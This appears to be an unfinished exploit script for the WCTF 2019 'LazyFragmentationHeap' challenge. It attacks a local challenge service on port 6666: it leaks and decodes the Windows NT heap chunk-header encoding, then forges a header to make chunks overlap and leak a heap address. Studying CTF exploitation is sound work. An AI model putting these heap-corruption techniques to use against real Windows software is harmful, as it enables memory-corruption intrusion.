'''
https://null2root.github.io/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html
https://github.com/scwuaptx/LazyFragmentationHeap/blob/master/exp.py
https://labs.bluefrostsecurity.de/blog.html/2022/08/16/windows-segment-heap-attacking-the-vs-allocator/#lsb-technique-overflowing-the-least-significant-byte
https://illmatics.com/Understanding_the_LFH.pdf
https://blog.lamarranet.com/wp-content/uploads/2021/09/WinDbg-Cheat-Sheet.pdf
'''

import socket
import struct
from time import sleep


class Connection:

    def __init__(self):
        self.sock = socket.socket()
        self.sock.connect(("127.0.0.1", 6666))

    def send(self, data: bytes):
        self.sock.send(data)

    def tobytes(self, data: str):
        return bytes(data, "utf-8")

    def recv_until(self, end: str):
        _end = self.tobytes(end)
        buf = b""
        while _end not in buf:
            buf += self.sock.recv(1)
        return buf

    def next(self):
        self.recv_until(":")

    def alloc(self, size: int, id: int):
        self.next()
        self.send(b"1\n")
        self.next()
        self.send(self.tobytes(str(size) + "\n"))
        self.next()
        self.send(self.tobytes(str(id) + "\n"))

    def edit(self, id: int, data: bytes):
        self.next()
        self.send(b"2\n")
        self.next()
        self.send(self.tobytes(str(id) + "\n"))
        self.next()
        self.send(data)

    def show(self, id: int):
        self.next()
        self.send(b"3\n")
        self.next()
        self.send(self.tobytes(str(id) + "\n"))
        self.next()
        # buf = self.recv_until("A" * 0x228)
        # return buf

    def free(self, id: int):
        self.next()
        self.send(b"4\n")
        self.next()
        self.send(self.tobytes(str(id) + "\n"))

    def openFile(self):
        self.next()
        self.send(b"5\n")
        self.next()
        self.send(b"1\n")
        self.next()
        self.send(b"3\n")

    def readFile(self, size: int, id: int):
        self.next()
        self.send(b"5\n")
        self.next()
        self.send(b"2\n")
        self.next()
        self.send(self.tobytes(str(id) + "\n"))
        self.next()
        self.send(self.tobytes(str(size) + "\n"))
        self.next()
        self.send(b"3\n")


'''
https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-english-version
Slide 20 - slide ...
Heap Chunk header (0x002322010023)
0x0023 - Previous size >> 4
0x22 - SmallTagIndex (first three bytes xor'd together(0x01 ^ 0x00 ^ 0x23))
0x01 -Flag (is chunk in use?????)
0x0023 size of chunk >> 4 (includes 0x8 byte header (0x0000002322010023))

Header is xor'd with _HEAP->encoding
xoring known value with xor'd value gives _HEAP->encoding
'''


def main():
    knownDecodedCookie = 0x2322010023

    conn = Connection()
    # Leak Heap Cookie
    for i in range(6):
        conn.openFile()
    conn.alloc(0x228, 1)
    conn.alloc(0x228, 2)
    conn.alloc(0x228, 3)
    conn.edit(1, b"A" * 0x228)
    conn.show(1)
    conn.recv_until("A" * 0x228)
    sleep(.1)
    knownEncodedCookie = conn.sock.recv(8)
    knownEncodedCookie = int.from_bytes(
        knownEncodedCookie[:-2].ljust(8, b"\x00"), "little")
    print(hex(knownEncodedCookie))
    heapEncoding = knownEncodedCookie ^ knownDecodedCookie & 0xffffffffffff

    # Create Overlapped Heap Chunk
    conn.alloc(0x268, 4)
    conn.alloc(0x5a0, 5)
    conn.alloc(0x1000, 6)
    conn.alloc(0x280, 7)
    conn.alloc(0x280, 0x12345678)  # cookie ^ 0x37010137)
    conn.openFile()
    conn.readFile(0x268, 4)
    fakeDecodedCookie = 0x27ae0101ae
    fakeEncodeCookie = heapEncoding ^ fakeDecodedCookie
    conn.edit(4, b"A" * 0x268 + struct.pack("<Q", fakeEncodeCookie))
    conn.free(5)

    # Leak Heap Address
    conn.alloc(0x5a0, 5)
    conn.edit(5, b"A" * 0x5a0)
    conn.show(6)
    sleep(.1)
    conn.next()
    print(conn.sock.recv(0x8))
    input("end")
    conn.send(b"6\n")


if __name__ == "__main__":
    main()


'''
if ID == 0; ID = 0xddaa

struct heap
{
0x0     0x00000beefdad0000
0x8     0
0x10    0
0x18    0x04
}

0x00000beefdad0000
0x0     0x0000ddaabeef1acd (after alloc)
0x8     slot one size (after alloc)
0x10    slot one ID (after alloc)
0x18    0x0000ddaabeef1acd (after alloc)
0x20    slot one heap alloc addr

0000015d`f7925840
0000015d`f7927960
0000015d`f7927960
'''
